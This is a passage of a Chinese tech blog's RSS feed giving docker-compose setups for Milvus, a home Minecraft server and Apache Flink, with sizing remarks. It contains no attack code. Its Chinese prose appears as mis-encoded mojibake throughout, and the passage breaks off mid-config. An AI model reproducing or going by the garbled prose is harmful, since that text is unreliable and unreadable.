&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  etcd:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: milvus-etcd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: quay.io/coreos/etcd:v3.5.18
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;nv&#34;&gt;ETCD_AUTO_COMPACTION_MODE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;revision
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;nv&#34;&gt;ETCD_AUTO_COMPACTION_RETENTION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;nv&#34;&gt;ETCD_QUOTA_BACKEND_BYTES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4294967296&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;nv&#34;&gt;ETCD_SNAPSHOT_COUNT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;50000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOCKER_VOLUME_DIRECTORY&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;:-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;/volumes/etcd:/etcd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: etcd -advertise-client-urls&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    healthcheck:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      test: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CMD&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;etcdctl&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;endpoint&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;health&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      interval: 30s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      timeout: 20s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      retries: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  minio:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: milvus-minio
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: minio/minio:RELEASE.2024-12-18T13-15-44Z
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      MINIO_ACCESS_KEY: rendoumi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      MINIO_SECRET_KEY: 12345abcde
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOCKER_VOLUME_DIRECTORY&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;:-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;/volumes/minio:/minio_data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: minio server /minio_data --console-address &lt;span class=&#34;s2&#34;&gt;&amp;#34;:9001&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    healthcheck:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      test: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CMD&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;curl&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-f&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost:9000/minio/health/live&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      interval: 30s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      timeout: 20s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      retries: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  standalone:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: milvus-standalone
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: milvusdb/milvus:v2.6.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;milvus&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;run&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;standalone&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    security_opt:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - seccomp:unconfined
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ETCD_ENDPOINTS: etcd:2379
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      MINIO_ADDRESS: minio:9000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      MQ_TYPE: woodpecker
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;DOCKER_VOLUME_DIRECTORY&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;:-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;/volumes/milvus:/var/lib/milvus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    healthcheck:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      test: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CMD&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;curl&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-f&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost:9091/healthz&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      interval: 30s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      start_period: 90s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      timeout: 20s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      retries: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;19530:19530&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;etcd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;minio&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  default:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    name: milvus
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢çš„æ–‡ä»¶ï¼ŒMINIO_ACCESS_KEYå’ŒMINIO_SECRET_KEYå·²ç»è¢«æ”¹æ‰äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Minecraftè‡ªå»ºæœåŠ¡å™¨çš„æ­å»º</title>
      <link>https://rendoumi.com/posts/20251124-minecraft/</link>
      <pubDate>Mon, 24 Nov 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251124-minecraft/</guid>
      <description>&lt;p&gt;å„¿å­å¤©å¤©ç©minecraftç©å¾—ä¸äº¦ä¹ä¹ï¼Œå°±æƒ³è‡ªå·±æ­ä¸ªæœåŠ¡å™¨ï¼Œç„¶åå½“å®¶åšä¸»äºº&lt;/p&gt;
&lt;p&gt;äºæ˜¯ä¹ï¼Œé‚£å°±æ­ä¸ªå§ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸä¸å¤ªå®¹æ˜“ï¼Œ&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°ä¸ªç½‘ç«™ï¼šhttps://docker-minecraft-server.readthedocs.io/en/latest/&lt;/p&gt;
&lt;p&gt;ç”¨docker runå§æ­»æ´»è·‘ä¸èµ·æ¥ï¼Œå¤§æ— è¯­&lt;/p&gt;
&lt;p&gt;æ”¹ç”¨docker composeå°±ä¸€ä¸‹èµ·æ¥äº†ï¼š&lt;/p&gt;
&lt;p&gt;docker-compose.yaml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  mc:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: itzg/minecraft-server:latest
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    pull_policy: always
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    tty: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    stdin_open: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;25565:25565&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      EULA: &lt;span class=&#34;s2&#34;&gt;&amp;#34;TRUE&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# attach the relative directory &amp;#39;data&amp;#39; to the container&amp;#39;s /data path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - ./data:/data
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼šå…³é”®çš„ä¸€æ­¥æ¥äº†ï¼Œå¯åŠ¨åï¼Œåˆ°docker composeçš„å½“å‰ç›®å½•&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi data/server.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;online-mode&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦åˆ™å®¢æˆ·ç«¯æ— æ³•è”ä¸ŠæœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å®¢æˆ·ç«¯å‘¢ï¼Œç›´æ¥ä¸‹è½½è¿™ä¸ªå¯åŠ¨å™¨ï¼Œç„¶åä¸ç”¨ä¸‹è½½ä»»ä½•javaçš„ä¸œè¥¿&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://webstatic.ctfile.com/assets/download/url94.ctfile.com/008854/HMCL-3.7.3.zip
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰“å¼€åä¼šè‡ªåŠ¨ä¸‹è½½javaå’Œå®¢æˆ·ç«¯ï¼Œç„¶åè¿æ¥æœåŠ¡å™¨çš„25565ç«¯å£ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”Ÿäº§ç¯å¢ƒFlinkçš„æ­å»º</title>
      <link>https://rendoumi.com/posts/20251121-flink_install/</link>
      <pubDate>Fri, 21 Nov 2025 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251121-flink_install/</guid>
      <description>&lt;p&gt;ç”Ÿäº§ç¯å¢ƒç”¨åˆ°äº†Flinkï¼Œé‚£å…¶å®æ— è®ºè…¾è®¯çš„flinkè¿˜æ˜¯awsçš„flinkï¼Œéƒ½æ˜¯è¿è¡Œåœ¨å®¹å™¨ä¸­çš„&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬è‡ªå»ºï¼Œä¹Ÿç”¨å®¹å™¨ï¼Œdocker-compose.yamlä¸€æŠŠæ¢­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  jobmanager:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: flink:1.17.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;8081:8081&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;FLINK_PROPERTIES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          jobmanager.memory.process.size: 4gb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          jobmanager.rpc.address: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  taskmanager:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: flink:1.17.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: taskmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;FLINK_PROPERTIES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        taskmanager.numberOfTaskSlots: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        taskmanager.memory.process.size: 8gb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        jobmanager.rpc.address: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    deploy:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          replicas: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„å•Šï¼Œä¸Šé¢èŠ‚ç‚¹æ˜¯16GBå†…å­˜ï¼Œæ‰€ä»¥jobåˆ†äº†4Gï¼Œç„¶åtaskç»™äº†8Gï¼ŒTaskSlotç»™äº†1ï¼Œå‰¯æœ¬ä¹Ÿæ˜¯1ã€‚å†…å­˜å¯Œè£•4Gã€‚æ˜¯è¿™ä¹ˆç®—çš„&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†çœ‹ä¸€ä¸ªé…ç½®ï¼Œæ˜¯æµ‹è¯•ç¯å¢ƒçš„ï¼ŒèŠ‚ç‚¹æ˜¯32Gï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  jobmanager:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: flink:1.17.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;8081:8081&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;FLINK_PROPERTIES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          jobmanager.memory.process.size: 2gb
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          jobmanager.rpc.address: jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  taskmanager:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: flink:1.17.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    depends_on:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - jobmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: taskmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    environment:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;FLINK_PROPERTIES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        taskmanager.numberOfTaskSlots: &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        taskmanager.memory.process.size: 8gb
